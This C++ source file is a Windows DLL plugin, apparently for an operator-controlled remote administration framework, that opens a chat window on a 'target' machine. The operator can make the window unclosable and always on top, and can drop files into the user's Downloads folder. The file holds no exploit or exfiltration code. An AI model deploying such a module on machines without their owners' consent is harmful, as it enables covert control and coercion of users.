/*
 * Chat Plugin — spawns a Win32 chat window on the target (Windows only).
 *
 * Build (MSVC):
 *   cl /LD /EHsc /O2 plugin.cpp /Fe:chat-windows-amd64.dll user32.lib gdi32.lib uxtheme.lib dwmapi.lib comdlg32.lib shell32.lib
 *
 * Build (MinGW):
 *   x86_64-w64-mingw32-g++ -shared -O2 -o chat-windows-amd64.dll plugin.cpp -luser32 -lgdi32 -luxtheme -ldwmapi -lcomdlg32 -lshell32
 */

#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <cctype>
#include <string>
#include <vector>

#define EXPORT extern "C" __declspec(dllexport)
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <uxtheme.h>
#include <dwmapi.h>
#include <commdlg.h>
#include <shellapi.h>

#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE
#define DWMWA_USE_IMMERSIVE_DARK_MODE 20
#endif
#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE_BEFORE_20H1
#define DWMWA_USE_IMMERSIVE_DARK_MODE_BEFORE_20H1 19
#endif

/* ------------------------------------------------------------------ */
/* Constants                                                           */
/* ------------------------------------------------------------------ */

#define WM_CHAT_APPEND (WM_APP + 1)
#define WM_CHAT_CLOSE  (WM_APP + 2)

#define IDC_LOG    101
#define IDC_INPUT  102
#define IDC_SEND   103
#define IDC_ATTACH 104

#define MAX_ATTACHMENT_BYTES (5 * 1024 * 1024)

static const char *WND_CLASS_NAME = "OverlordChatWnd";

/* ------------------------------------------------------------------ */
/* Host callback                                                       */
/* ------------------------------------------------------------------ */

typedef void (__stdcall *host_callback_t)(
    const char *event, uintptr_t eventLen,
    const char *payload, uintptr_t payloadLen);

/* ------------------------------------------------------------------ */
/* Chat configuration                                                  */
/* ------------------------------------------------------------------ */

struct ChatConfig {
    char operatorName[128];
    char targetName[128];
    char title[256];
    bool closable;
    bool alwaysOnTop;
};

/* ------------------------------------------------------------------ */
/* Global state                                                        */
/* ------------------------------------------------------------------ */

static host_callback_t g_callback       = nullptr;
static CRITICAL_SECTION g_cs;
static bool             g_cs_init       = false;
static char             g_client_id[256] = {0};
static ChatConfig       g_config        = {"Operator", "User", "Chat", true, false};
static HWND             g_hwnd          = NULL;
static HWND             g_hwnd_log      = NULL;
static HWND             g_hwnd_input    = NULL;
static HWND             g_hwnd_send     = NULL;
static HWND             g_hwnd_attach   = NULL;
static HANDLE           g_thread        = NULL;
static bool             g_class_reg     = false;
static HFONT            g_font          = NULL;
static HBRUSH           g_bg_brush      = NULL;
static HBRUSH           g_log_brush     = NULL;
static HBRUSH           g_input_brush   = NULL;
static WNDPROC          g_orig_input_proc = NULL;
static HINSTANCE        g_hInstance     = NULL;

/* ------------------------------------------------------------------ */
/* DllMain                                                             */
/* ------------------------------------------------------------------ */

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) g_hInstance = hDll;
    return TRUE;
}

/* ------------------------------------------------------------------ */
/* JSON helpers                                                        */
/* ------------------------------------------------------------------ */

static std::string json_extract(const char *json, int len, const char *key) {
    if (!json || len <= 0) return "";
    std::string hay(json, (size_t)len);
    std::string needle = std::string("\"") + key + "\":\"";
    auto pos = hay.find(needle);
    if (pos == std::string::npos) {
        needle = std::string("\"") + key + "\": \"";
        pos = hay.find(needle);
    }
    if (pos == std::string::npos) return "";
    pos += needle.size();
    std::string result;
    while (pos < hay.size() && hay[pos] != '"') {
        if (hay[pos] == '\\' && pos + 1 < hay.size()) {
            pos++;
            switch (hay[pos]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += hay[pos]; break;
            }
        } else {
            result += hay[pos];
        }
        pos++;
    }
    return result;
}

static bool json_extract_bool(const char *json, int len, const char *key, bool def) {
    if (!json || len <= 0) return def;
    std::string hay(json, (size_t)len);
    std::string needle = std::string("\"") + key + "\":";
    auto pos = hay.find(needle);
    if (pos == std::string::npos) return def;
    pos += needle.size();
    while (pos < hay.size() && hay[pos] == ' ') pos++;
    if (pos >= hay.size()) return def;
    return hay[pos] == 't';
}

static std::string json_escape(const std::string &s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if ((unsigned char)c >= 0x20) out += c;
                break;
        }
    }
    return out;
}

/* ------------------------------------------------------------------ */
/* Base64                                                              */
/* ------------------------------------------------------------------ */

static const char kB64Tab[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string base64_encode(const unsigned char *data, size_t len) {
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    size_t i = 0;
    while (i + 3 <= len) {
        unsigned a = data[i], b = data[i + 1], c = data[i + 2];
        out += kB64Tab[a >> 2];
        out += kB64Tab[((a & 0x03) << 4) | (b >> 4)];
        out += kB64Tab[((b & 0x0f) << 2) | (c >> 6)];
        out += kB64Tab[c & 0x3f];
        i += 3;
    }
    if (i < len) {
        unsigned a = data[i];
        unsigned b = (i + 1 < len) ? data[i + 1] : 0;
        out += kB64Tab[a >> 2];
        out += kB64Tab[((a & 0x03) << 4) | (b >> 4)];
        if (i + 1 < len) {
            out += kB64Tab[(b & 0x0f) << 2];
            out += '=';
        } else {
            out += "==";
        }
    }
    return out;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static std::vector<unsigned char> base64_decode(const char *s, size_t len) {
    std::vector<unsigned char> out;
    out.reserve(len * 3 / 4 + 4);
    int buf = 0, bits = 0;
    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if (c == '=' || c == '\n' || c == '\r' || c == ' ' || c == '\t') continue;
        int v = b64_val(c);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back((unsigned char)((buf >> bits) & 0xff));
        }
    }
    return out;
}

/* ------------------------------------------------------------------ */
/* Filename / path helpers                                             */
/* ------------------------------------------------------------------ */

static std::string basename_only(const std::string &p) {
    auto pos = p.find_last_of("\\/");
    return (pos == std::string::npos) ? p : p.substr(pos + 1);
}

static std::string sanitize_filename(const std::string &name) {
    std::string b = basename_only(name);
    std::string out;
    for (char c : b) {
        if (c == ':' || c == '*' || c == '?' || c == '"' ||
            c == '<' || c == '>' || c == '|' || c == '\\' || c == '/') {
            out += '_';
        } else if ((unsigned char)c < 0x20) {
            out += '_';
        } else {
            out += c;
        }
    }
    if (out.empty()) out = "file";
    return out;
}

static std::string guess_mime(const std::string &name) {
    auto pos = name.find_last_of('.');
    if (pos == std::string::npos) return "application/octet-stream";
    std::string ext = name.substr(pos + 1);
    for (auto &c : ext) c = (char)tolower((unsigned char)c);
    if (ext == "png")  return "image/png";
    if (ext == "jpg" || ext == "jpeg") return "image/jpeg";
    if (ext == "gif")  return "image/gif";
    if (ext == "webp") return "image/webp";
    if (ext == "bmp")  return "image/bmp";
    if (ext == "svg")  return "image/svg+xml";
    if (ext == "txt")  return "text/plain";
    if (ext == "pdf")  return "application/pdf";
    if (ext == "zip")  return "application/zip";
    if (ext == "json") return "application/json";
    return "application/octet-stream";
}

static std::string get_save_dir() {
    char prof[MAX_PATH];
    DWORD n = GetEnvironmentVariableA("USERPROFILE", prof, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return "";
    std::string dir(prof);
    dir += "\\Downloads";
    return dir;
}

static std::string unique_path(const std::string &dir, const std::string &name) {
    std::string full = dir + "\\" + name;
    DWORD attrs = GetFileAttributesA(full.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) return full;

    auto dot = name.find_last_of('.');
    std::string stem = (dot == std::string::npos) ? name : name.substr(0, dot);
    std::string ext  = (dot == std::string::npos) ? ""   : name.substr(dot);
    for (int i = 1; i < 1000; i++) {
        char buf[32];
        sprintf(buf, " (%d)", i);
        std::string cand = dir + "\\" + stem + buf + ext;
        if (GetFileAttributesA(cand.c_str()) == INVALID_FILE_ATTRIBUTES) return cand;
    }
    return full;
}

/* ------------------------------------------------------------------ */
/* send_event — call host callback                                     */
/* ------------------------------------------------------------------ */

static void send_event(const char *event, const char *payload, size_t payloadLen) {
    host_callback_t cb = g_callback;
    if (!cb) return;
    int elen = event ? (int)strlen(event) : 0;
    cb(event, (uintptr_t)elen, payload, (uintptr_t)payloadLen);
}

static void send_event(const char *event, const char *payload) {
    send_event(event, payload, payload ? strlen(payload) : 0);
}

/* ------------------------------------------------------------------ */
/* Chat window helpers                                                 */
/* ------------------------------------------------------------------ */

static void append_to_log(const char *text) {
    if (!g_hwnd_log) return;
    int len = GetWindowTextLengthA(g_hwnd_log);
    SendMessageA(g_hwnd_log, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    SendMessageA(g_hwnd_log, EM_REPLACESEL, FALSE, (LPARAM)text);
    SendMessageA(g_hwnd_log, EM_SCROLLCARET, 0, 0);
}

static void post_log_line(const std::string &text) {
    if (!g_hwnd) return;
    char *dup = _strdup(text.c_str());
    PostMessageA(g_hwnd, WM_CHAT_APPEND, 0, (LPARAM)dup);
}

static void do_send_message() {
    char buf[4096];
    int len = GetWindowTextA(g_hwnd_input, buf, sizeof(buf));
    if (len <= 0) return;
    SetWindowTextA(g_hwnd_input, "");

    std::string text(buf, (size_t)len);
    std::string display = std::string(g_config.targetName) + ": " + text + "\r\n";
    append_to_log(display.c_str());

    std::string payload = "{\"from\":\"" + json_escape(g_config.targetName) +
                          "\",\"text\":\"" + json_escape(text) + "\"}";
    send_event("chat_message", payload.c_str());
}

static void do_attach_file() {
    char path[MAX_PATH * 2] = {0};
    OPENFILENAMEA ofn = {};
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner   = g_hwnd;
    ofn.lpstrFile   = path;
    ofn.nMaxFile    = sizeof(path);
    ofn.lpstrFilter = "All Files\0*.*\0Images\0*.png;*.jpg;*.jpeg;*.gif;*.webp;*.bmp\0";
    ofn.lpstrTitle  = "Attach file";
    ofn.Flags       = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER | OFN_NOCHANGEDIR;
    if (!GetOpenFileNameA(&ofn)) return;

    FILE *f = fopen(path, "rb");
    if (!f) {
        post_log_line("[chat] Could not open selected file\r\n");
        return;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize <= 0) { fclose(f); return; }
    if ((size_t)fsize > MAX_ATTACHMENT_BYTES) {
        fclose(f);
        char msg[160];
        sprintf(msg, "[chat] File too large (%ld bytes); max is %d bytes\r\n",
                fsize, MAX_ATTACHMENT_BYTES);
        post_log_line(msg);
        return;
    }

    std::vector<unsigned char> data((size_t)fsize);
    size_t got = fread(data.data(), 1, (size_t)fsize, f);
    fclose(f);
    if (got != (size_t)fsize) {
        post_log_line("[chat] Failed to read attachment\r\n");
        return;
    }

    std::string name = basename_only(path);
    std::string mime = guess_mime(name);
    std::string b64  = base64_encode(data.data(), data.size());

    std::string payload;
    payload.reserve(b64.size() + 256);
    payload += "{\"from\":\"";
    payload += json_escape(g_config.targetName);
    payload += "\",\"name\":\"";
    payload += json_escape(name);
    payload += "\",\"mime\":\"";
    payload += json_escape(mime);
    payload += "\",\"dataB64\":\"";
    payload += b64;
    payload += "\"}";

    char fmt[256];
    sprintf(fmt, "%s sent file: %s (%ld bytes)\r\n",
            g_config.targetName, name.c_str(), fsize);
    post_log_line(fmt);

    send_event("chat_attachment", payload.data(), payload.size());
}

/* ------------------------------------------------------------------ */
/* Input subclass — Enter key sends message                            */
/* ------------------------------------------------------------------ */

static LRESULT CALLBACK InputSubclassProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_KEYDOWN && wp == VK_RETURN) {
        do_send_message();
        return 0;
    }
    return CallWindowProcA(g_orig_input_proc, hwnd, msg, wp, lp);
}

/* ------------------------------------------------------------------ */
/* Window procedure                                                    */
/* ------------------------------------------------------------------ */

static LRESULT CALLBACK ChatWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {

    case WM_CREATE: {
        g_bg_brush    = CreateSolidBrush(RGB(30, 33, 40));
        g_log_brush   = CreateSolidBrush(RGB(18, 20, 26));
        g_input_brush = CreateSolidBrush(RGB(35, 38, 48));
        g_font = CreateFontA(-15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");

        g_hwnd_log = CreateWindowExA(
            0, "EDIT", "",
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
            0, 0, 0, 0, hwnd, (HMENU)(uintptr_t)IDC_LOG, g_hInstance, NULL);

        SetWindowTheme(g_hwnd_log, L"DarkMode_Explorer", NULL);

        g_hwnd_attach = CreateWindowExA(
            0, "BUTTON", "+",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
            0, 0, 0, 0, hwnd, (HMENU)(uintptr_t)IDC_ATTACH, g_hInstance, NULL);

        g_hwnd_input = CreateWindowExA(
            0, "EDIT", "",
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | WS_TABSTOP,
            0, 0, 0, 0, hwnd, (HMENU)(uintptr_t)IDC_INPUT, g_hInstance, NULL);

        SetWindowTheme(g_hwnd_input, L"DarkMode_Explorer", NULL);

        g_hwnd_send = CreateWindowExA(
            0, "BUTTON", "Send",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
            0, 0, 0, 0, hwnd, (HMENU)(uintptr_t)IDC_SEND, g_hInstance, NULL);

        SendMessageA(g_hwnd_log,    WM_SETFONT, (WPARAM)g_font, TRUE);
        SendMessageA(g_hwnd_input,  WM_SETFONT, (WPARAM)g_font, TRUE);
        SendMessageA(g_hwnd_send,   WM_SETFONT, (WPARAM)g_font, TRUE);
        SendMessageA(g_hwnd_attach, WM_SETFONT, (WPARAM)g_font, TRUE);

        g_orig_input_proc = (WNDPROC)SetWindowLongPtrA(
            g_hwnd_input, GWLP_WNDPROC, (LONG_PTR)InputSubclassProc);

        if (!g_config.closable) {
            HMENU sys = GetSystemMenu(hwnd, FALSE);
            if (sys) EnableMenuItem(sys, SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
        }

        return 0;
    }

    case WM_SIZE: {
        RECT rc;
        GetClientRect(hwnd, &rc);
        int w = rc.right, h = rc.bottom;
        int pad = 10, inputH = 32, btnW = 65, attachW = 32, gap = 8;

        MoveWindow(g_hwnd_log,    pad, pad, w - 2 * pad, h - inputH - 3 * pad, TRUE);
        MoveWindow(g_hwnd_attach, pad, h - inputH - pad, attachW, inputH, TRUE);
        MoveWindow(g_hwnd_input,
                   pad + attachW + gap,
                   h - inputH - pad,
                   w - btnW - attachW - 2 * pad - 2 * gap,
                   inputH, TRUE);
        MoveWindow(g_hwnd_send,   w - btnW - pad, h - inputH - pad, btnW, inputH, TRUE);
        return 0;
    }

    case WM_GETMINMAXINFO: {
        MINMAXINFO *mmi = (MINMAXINFO *)lp;
        mmi->ptMinTrackSize.x = 300;
        mmi->ptMinTrackSize.y = 250;
        return 0;
    }

    case WM_COMMAND:
        if (LOWORD(wp) == IDC_SEND && HIWORD(wp) == BN_CLICKED) {
            do_send_message();
            SetFocus(g_hwnd_input);
            return 0;
        }
        if (LOWORD(wp) == IDC_ATTACH && HIWORD(wp) == BN_CLICKED) {
            do_attach_file();
            SetFocus(g_hwnd_input);
            return 0;
        }
        break;

    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wp;
        HWND ctrl = (HWND)lp;
        SetTextColor(hdc, RGB(220, 225, 234));
        if (ctrl == g_hwnd_log) {
            SetBkColor(hdc, RGB(18, 20, 26));
            return (LRESULT)g_log_brush;
        }
        SetBkColor(hdc, RGB(35, 38, 48));
        return (LRESULT)g_input_brush;
    }

    case WM_CTLCOLORSTATIC: {
        HDC hdc = (HDC)wp;
        SetTextColor(hdc, RGB(220, 225, 234));
        SetBkColor(hdc, RGB(18, 20, 26));
        return (LRESULT)g_log_brush;
    }

    case WM_ERASEBKGND: {
        HDC hdc = (HDC)wp;
        RECT rc;
        GetClientRect(hwnd, &rc);
        FillRect(hdc, &rc, g_bg_brush);
        return 1;
    }

    case WM_DRAWITEM: {
        DRAWITEMSTRUCT *dis = (DRAWITEMSTRUCT *)lp;
        if (dis->CtlID == IDC_SEND) {
            COLORREF col = (dis->itemState & ODS_SELECTED)
                               ? RGB(29, 78, 216)
                               : RGB(37, 99, 235);
            HBRUSH br = CreateSolidBrush(col);
            FillRect(dis->hDC, &dis->rcItem, br);
            DeleteObject(br);

            HPEN pen = CreatePen(PS_SOLID, 1, RGB(30, 64, 175));
            HPEN oldPen = (HPEN)SelectObject(dis->hDC, pen);
            HBRUSH oldBr = (HBRUSH)SelectObject(dis->hDC, GetStockObject(NULL_BRUSH));
            RoundRect(dis->hDC, dis->rcItem.left, dis->rcItem.top,
                      dis->rcItem.right, dis->rcItem.bottom, 6, 6);
            SelectObject(dis->hDC, oldPen);
            SelectObject(dis->hDC, oldBr);
            DeleteObject(pen);

            SetTextColor(dis->hDC, RGB(255, 255, 255));
            SetBkMode(dis->hDC, TRANSPARENT);
            SelectObject(dis->hDC, g_font);
            DrawTextA(dis->hDC, "Send", -1, &dis->rcItem,
                      DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            return TRUE;
        }
        if (dis->CtlID == IDC_ATTACH) {
            COLORREF col = (dis->itemState & ODS_SELECTED)
                               ? RGB(48, 56, 72)
                               : RGB(60, 68, 86);
            HBRUSH br = CreateSolidBrush(col);
            FillRect(dis->hDC, &dis->rcItem, br);
            DeleteObject(br);

            HPEN pen = CreatePen(PS_SOLID, 1, RGB(80, 90, 110));
            HPEN oldPen = (HPEN)SelectObject(dis->hDC, pen);
            HBRUSH oldBr = (HBRUSH)SelectObject(dis->hDC, GetStockObject(NULL_BRUSH));
            RoundRect(dis->hDC, dis->rcItem.left, dis->rcItem.top,
                      dis->rcItem.right, dis->rcItem.bottom, 6, 6);
            SelectObject(dis->hDC, oldPen);
            SelectObject(dis->hDC, oldBr);
            DeleteObject(pen);

            SetTextColor(dis->hDC, RGB(220, 225, 234));
            SetBkMode(dis->hDC, TRANSPARENT);
            SelectObject(dis->hDC, g_font);
            DrawTextA(dis->hDC, "+", -1, &dis->rcItem,
                      DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            return TRUE;
        }
        break;
    }

    case WM_CHAT_APPEND: {
        char *text = (char *)lp;
        if (text) {
            append_to_log(text);
            free(text);
        }
        return 0;
    }

    case WM_CHAT_CLOSE:
        DestroyWindow(hwnd);
        return 0;

    case WM_CLOSE:
        if (!g_config.closable) return 0;
        send_event("chat_closed", "{}");
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        if (g_orig_input_proc && g_hwnd_input) {
            SetWindowLongPtrA(g_hwnd_input, GWLP_WNDPROC, (LONG_PTR)g_orig_input_proc);
            g_orig_input_proc = NULL;
        }
        g_hwnd_log    = NULL;
        g_hwnd_input  = NULL;
        g_hwnd_send   = NULL;
        g_hwnd_attach = NULL;
        g_hwnd        = NULL;
        if (g_font)        { DeleteObject(g_font);        g_font        = NULL; }
        if (g_bg_brush)    { DeleteObject(g_bg_brush);    g_bg_brush    = NULL; }
        if (g_log_brush)   { DeleteObject(g_log_brush);   g_log_brush   = NULL; }
        if (g_input_brush) { DeleteObject(g_input_brush); g_input_brush = NULL; }
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcA(hwnd, msg, wp, lp);
}

/* ------------------------------------------------------------------ */
/* Window thread                                                       */
/* ------------------------------------------------------------------ */

static DWORD WINAPI WindowThreadProc(LPVOID) {
    if (!g_class_reg) {
        WNDCLASSEXA wc = {};
        wc.cbSize        = sizeof(wc);
        wc.style         = CS_HREDRAW | CS_VREDRAW;
        wc.lpfnWndProc   = ChatWndProc;
        wc.hInstance      = g_hInstance;
        wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
        wc.lpszClassName = WND_CLASS_NAME;
        wc.hbrBackground = NULL;
        if (RegisterClassExA(&wc)) g_class_reg = true;
        else return 1;
    }

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int winW = 420, winH = 520;
    int x = (screenW - winW) / 2;
    int y = (screenH - winH) / 2;

    DWORD style = WS_OVERLAPPEDWINDOW;
    if (!g_config.closable) {
        style &= ~WS_SYSMENU;
        style |= WS_CAPTION | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_THICKFRAME;
    }

    g_hwnd = CreateWindowExA(
        g_config.alwaysOnTop ? WS_EX_TOPMOST : 0,
        WND_CLASS_NAME, g_config.title,
        style,
        x, y, winW, winH,
        NULL, NULL, g_hInstance, NULL);

    if (!g_hwnd) return 1;

    BOOL darkTitleBar = TRUE;
    if (FAILED(DwmSetWindowAttribute(g_hwnd, DWMWA_USE_IMMERSIVE_DARK_MODE,
                                     &darkTitleBar, sizeof(darkTitleBar)))) {
        DwmSetWindowAttribute(g_hwnd, DWMWA_USE_IMMERSIVE_DARK_MODE_BEFORE_20H1,
                              &darkTitleBar, sizeof(darkTitleBar));
    }

    ShowWindow(g_hwnd, SW_SHOW);
    UpdateWindow(g_hwnd);
    SetForegroundWindow(g_hwnd);

    send_event("chat_opened", "{}");

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/* Open / close helpers                                                */
/* ------------------------------------------------------------------ */

static void close_chat_window() {
    if (g_hwnd) {
        PostMessageA(g_hwnd, WM_CHAT_CLOSE, 0, 0);
    }
    if (g_thread) {
        if (WaitForSingleObject(g_thread, 5000) == WAIT_TIMEOUT) {
            TerminateThread(g_thread, 0);
        }
        CloseHandle(g_thread);
        g_thread = NULL;
    }
}

static void open_chat_window() {
    close_chat_window();
    g_thread = CreateThread(NULL, 0, WindowThreadProc, NULL, 0, NULL);
}

/* ------------------------------------------------------------------ */
/* Plugin ABI exports                                                  */
/* ------------------------------------------------------------------ */

EXPORT const char *PluginGetRuntime() {
    return "cpp";
}

EXPORT void PluginSetCallback(uint64_t cb) {
    g_callback = reinterpret_cast<host_callback_t>(static_cast<uintptr_t>(cb));
}

EXPORT int PluginOnLoad(const char *hostInfo, int hostInfoLen, uint64_t cb) {
    g_callback = reinterpret_cast<host_callback_t>(static_cast<uintptr_t>(cb));

    if (!g_cs_init) {
        InitializeCriticalSection(&g_cs);
        g_cs_init = true;
    }

    std::string cid = json_extract(hostInfo, hostInfoLen, "clientId");
    strncpy(g_client_id, cid.c_str(), sizeof(g_client_id) - 1);
    g_client_id[sizeof(g_client_id) - 1] = '\0';

    fprintf(stderr, "[chat] loaded, clientId=%s\n", g_client_id);
    send_event("ready", "{\"message\":\"chat plugin ready\"}");
    return 0;
}

EXPORT int PluginOnEvent(const char *event, int eventLen,
                         const char *payload, int payloadLen) {
    std::string ev(event, (size_t)eventLen);
    std::string pl(payload ? payload : "", payload ? (size_t)payloadLen : 0u);

    if (ev == "open_chat") {
        std::string opName = json_extract(pl.c_str(), (int)pl.size(), "operatorName");
        std::string tgName = json_extract(pl.c_str(), (int)pl.size(), "targetName");
        std::string title  = json_extract(pl.c_str(), (int)pl.size(), "title");
        bool closable      = json_extract_bool(pl.c_str(), (int)pl.size(), "closable", true);
        bool onTop         = json_extract_bool(pl.c_str(), (int)pl.size(), "alwaysOnTop", false);

        EnterCriticalSection(&g_cs);
        if (!opName.empty()) strncpy(g_config.operatorName, opName.c_str(), sizeof(g_config.operatorName) - 1);
        if (!tgName.empty()) strncpy(g_config.targetName,   tgName.c_str(), sizeof(g_config.targetName)   - 1);
        if (!title.empty())  strncpy(g_config.title,         title.c_str(),  sizeof(g_config.title)        - 1);
        g_config.closable    = closable;
        g_config.alwaysOnTop = onTop;
        LeaveCriticalSection(&g_cs);

        open_chat_window();
        return 0;
    }

    if (ev == "chat_message") {
        std::string from = json_extract(pl.c_str(), (int)pl.size(), "from");
        std::string text = json_extract(pl.c_str(), (int)pl.size(), "text");
        if (from.empty()) from = g_config.operatorName;
        std::string display = from + ": " + text + "\r\n";

        if (g_hwnd) {
            char *dup = _strdup(display.c_str());
            PostMessageA(g_hwnd, WM_CHAT_APPEND, 0, (LPARAM)dup);
        }
        return 0;
    }

    if (ev == "chat_attachment") {
        std::string from = json_extract(pl.c_str(), (int)pl.size(), "from");
        std::string name = json_extract(pl.c_str(), (int)pl.size(), "name");
        std::string b64  = json_extract(pl.c_str(), (int)pl.size(), "dataB64");
        if (from.empty()) from = g_config.operatorName;
        if (name.empty()) name = "file";
        if (b64.empty()) {
            std::string err = "[chat] attachment from " + from + " had no data\r\n";
            post_log_line(err);
            return 0;
        }

        std::vector<unsigned char> bytes = base64_decode(b64.data(), b64.size());
        if (bytes.empty()) {
            std::string err = "[chat] failed to decode attachment from " + from + "\r\n";
            post_log_line(err);
            return 0;
        }

        std::string dir = get_save_dir();
        if (dir.empty()) {
            post_log_line("[chat] could not resolve temp directory\r\n");
            return 0;
        }
        std::string safe = sanitize_filename(name);
        std::string full = unique_path(dir, safe);

        FILE *f = fopen(full.c_str(), "wb");
        if (!f) {
            std::string err = "[chat] could not write " + full + "\r\n";
            post_log_line(err);
            return 0;
        }
        size_t wrote = fwrite(bytes.data(), 1, bytes.size(), f);
        fclose(f);
        if (wrote != bytes.size()) {
            std::string err = "[chat] short write to " + full + "\r\n";
            post_log_line(err);
            return 0;
        }

        char header[128];
        sprintf(header, "%s sent file: %s (%zu bytes)\r\n",
                from.c_str(), name.c_str(), bytes.size());
        std::string line = std::string(header) + "  Saved to: " + full + "\r\n";
        post_log_line(line);
        return 0;
    }

    if (ev == "close_chat") {
        if (g_hwnd) send_event("chat_closed", "{}");
        close_chat_window();
        return 0;
    }

    fprintf(stderr, "[chat] unhandled event: %s\n", ev.c_str());
    return 0;
}

EXPORT void PluginOnUnload() {
    fprintf(stderr, "[chat] unloading\n");
    close_chat_window();
    g_callback = nullptr;
    g_client_id[0] = '\0';
    if (g_cs_init) {
        DeleteCriticalSection(&g_cs);
        g_cs_init = false;
    }
    if (g_class_reg) {
        UnregisterClassA(WND_CLASS_NAME, g_hInstance);
        g_class_reg = false;
    }
}
